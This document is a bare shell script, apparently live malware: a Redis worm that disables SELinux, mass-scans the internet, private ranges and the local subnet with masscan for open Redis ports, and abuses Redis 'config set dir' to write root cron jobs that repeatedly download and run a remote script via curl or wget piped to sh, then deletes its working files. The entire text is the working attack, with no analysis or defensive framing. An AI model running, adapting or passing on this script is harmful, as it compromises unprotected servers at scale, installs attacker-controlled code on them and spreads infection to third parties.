

setenforce 0 2>/dev/null
ulimit -n 50000
ulimit -u 50000
sleep 1
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2>/dev/null
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2>/dev/null
sleep 1
rm -rf .dat .shard .ranges .lan 2>/dev/null
sleep 1
echo 'config set dbfilename "backup.db"' > .dat
echo 'save' >> .dat
echo 'flushall' >> .dat
echo 'set qwERZJSG "\n*/1 * * * * curl -fsSL http://img.namunil.com/ash.php | sh\n\n"' >> .dat
echo 'set ftEKeh "\n*/2 * * * * wget -q -O- http://img.namunil.com/ash.php | sh\n\n"' >> .dat
echo 'set ugwRFlSI "\n*/3 * * * * curl -fsSL http://img.namunil.com/ash.php | sh\n\n"' >> .dat
echo 'set ClOqrUQh "\n*/4 * * * * wget -q -O- http://img.namunil.com/ash.php | sh\n\n"' >> .dat
echo 'config set dir "/var/spool/cron/"' >> .dat
echo 'config set dbfilename "root"' >> .dat
echo 'save' >> .dat
echo 'config set dir "/var/spool/cron/crontabs"' >> .dat
echo 'save' >> .dat
sleep 1
masscan --max-rate 15000 -p6379,6380 --shard 9130/22000 --exclude 224.0.0.0-255.255.255.255 0.0.0.0/0 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .shard
sleep 1
while read -r h p; do
cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
done < .shard
sleep 1
masscan --max-rate 15000 -p6379,6380 192.168.0.0/16 172.16.0.0/16 14.18.0.0/16 14.238.0.0/16 14.138.0.0/16 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .ranges
sleep 1
while read -r h p; do
cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
done < .ranges
sleep 1
ip a | grep -oE '([0-9]{1,3}.?){4}/[0-9]{2}' 2>/dev/null | sed 's/\/\([0-9]\{2\}\)/\/16/g' > .inet
sleep 1
masscan --max-rate 15000 -p6379,6380 -iL .inet | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .lan
sleep 1
while read -r h p; do
cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
done < .lan
sleep 60
rm -rf .dat .shard .ranges .lan 2>/dev/null

